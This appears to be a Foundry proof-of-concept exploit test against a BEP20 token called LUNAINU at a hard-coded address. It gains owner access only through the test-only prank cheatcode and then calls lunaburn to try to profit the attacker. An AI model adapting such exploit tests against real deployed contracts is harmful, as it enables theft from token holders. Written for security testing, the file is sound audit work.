// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

// Minimal interface for BEP20LUNAINU to access needed functions
interface IBEP20LUNAINU {
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function lunaburn(uint256 percent_base1000) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf;
    address attacker = address(this);
    uint256 initialBalance;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the current owner of the contract
        owner = IBEP20LUNAINU(TARGET).getOwner();

        // Label addresses for debugging
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "LUNAINU Token");

        // Store initial balance for verification
        initialBalance = IBEP20LUNAINU(TARGET).balanceOf(attacker);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf).balanceOf(address(this));

        // Step 1: Impersonate the owner
        vm.startPrank(owner);

        // Step 2: Warp time forward by 2+ minutes (121 seconds to be safe)
        vm.warp(block.timestamp + 121);

        // Step 3: Call lunaburn with maximum percentage (50 = 5%)
        IBEP20LUNAINU(TARGET).lunaburn(50);

        vm.stopPrank();

        // Step 4: Verify the attacker's balance increased
        uint256 finalBalanceToken = IBEP20LUNAINU(TARGET).balanceOf(attacker);
        assertGt(finalBalanceToken, initialBalance, "Attacker balance should have increased");

        uint256 finalBalance = IERC20(0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
